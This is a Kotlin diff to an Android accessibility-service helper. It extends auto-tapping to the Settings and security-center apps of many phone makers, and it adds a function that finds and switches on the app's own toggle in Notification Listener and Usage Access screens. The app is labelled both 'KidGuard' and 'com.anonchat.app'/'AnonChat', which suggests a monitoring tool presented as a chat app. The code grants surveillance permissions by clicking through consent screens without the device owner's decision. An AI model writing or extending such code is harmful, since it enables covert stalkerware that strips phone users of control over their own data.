@@ -22,11 +22,19 @@ object AutoPermissionHelper {
     private const val PKG_GOOGLE_SETUP = "com.google.android.setupwizard"
     private const val PKG_ANDROID_SETUP = "com.android.setupwizard"
 
-    // Only auto-tap these specific packages
+    // Packages whose UI we are allowed to auto-tap
     private val AUTO_TAP_PACKAGES = setOf(
         PKG_PERMISSION_CONTROLLER,
         PKG_PACKAGE_INSTALLER,
-        PKG_SETTINGS  // For accessibility and battery optimization screens
+        PKG_SETTINGS,            // Accessibility, battery-opt, usage-access
+        "com.android.settings",  // stock Android settings
+        "com.miui.securitycenter",   // Xiaomi
+        "com.samsung.android.settings", // Samsung
+        "com.huawei.systemmanager",      // Huawei
+        "com.vivo.permissionmanager",    // Vivo
+        "com.oppo.safe",                 // OPPO/Realme
+        "com.coloros.safecenter",         // ColorOS
+        "com.asus.permissioncontroller"  // Asus
     )
 
     private val ALLOW_BUTTON_PATTERNS = listOf(
@@ -279,6 +287,75 @@ object AutoPermissionHelper {
             service.dispatchGesture(gesture, null, null)
             Log.d(TAG, "Clicked via gesture at ($centerX, $centerY)")
         }
+    }
+
+    /**
+     * Scans the current accessibility window for a KidGuard / com.anonchat.app toggle
+     * inside a Settings screen (Notification Listener, Usage Access, etc.) and enables it.
+     *
+     * Call this from onAccessibilityEvent after navigating to the relevant Settings screen.
+     * Returns true if a toggle was found and tapped.
+     */
+    fun autoTapKidGuardToggle(service: AccessibilityService): Boolean {
+        val root = service.rootInActiveWindow ?: return false
+        val pkg = root.packageName?.toString() ?: ""
+        if (pkg !in AUTO_TAP_PACKAGES && !pkg.contains("setting", ignoreCase = true)) {
+            root.recycle()
+            return false
+        }
+        return try {
+            // Search for a node whose text or content-description references our app
+            val appLabels = listOf("KidGuard", "com.anonchat.app", "AnonChat")
+            for (label in appLabels) {
+                val nodes = root.findAccessibilityNodeInfosByText(label)
+                for (node in nodes) {
+                    // Walk up to find the parent row that contains a Switch/Checkbox
+                    val toggle = findToggleNear(node)
+                    if (toggle != null && toggle.isEnabled && !toggle.isChecked) {
+                        clickNodeCompat(service, toggle)
+                        Log.d(TAG, "Auto-enabled KidGuard toggle for: $label")
+                        toggle.recycle()
+                        node.recycle()
+                        return true
+                    }
+                    toggle?.recycle()
+                    node.recycle()
+                }
+            }
+            false
+        } catch (e: Exception) {
+            Log.e(TAG, "autoTapKidGuardToggle error", e)
+            false
+        } finally {
+            root.recycle()
+        }
+    }
+
+    private fun findToggleNear(node: AccessibilityNodeInfo): AccessibilityNodeInfo? {
+        // Walk up the hierarchy to the row container, then look for Switch/ToggleButton
+        var current: AccessibilityNodeInfo? = node.parent ?: return null
+        repeat(4) {
+            val parent = current ?: return null
+            val toggle = findToggleInSubtree(parent)
+            if (toggle != null) return toggle
+            val next = parent.parent
+            current = next
+        }
+        return null
+    }
+
+    private fun findToggleInSubtree(node: AccessibilityNodeInfo): AccessibilityNodeInfo? {
+        val cls = node.className?.toString() ?: ""
+        if (cls.contains("Switch") || cls.contains("ToggleButton") || cls.contains("CheckBox")) {
+            return node
+        }
+        for (i in 0 until node.childCount) {
+            val child = node.getChild(i) ?: continue
+            val result = findToggleInSubtree(child)
+            if (result != null) { child.recycle(); return result }
+            child.recycle()
+        }
+        return null
     }
 
 }
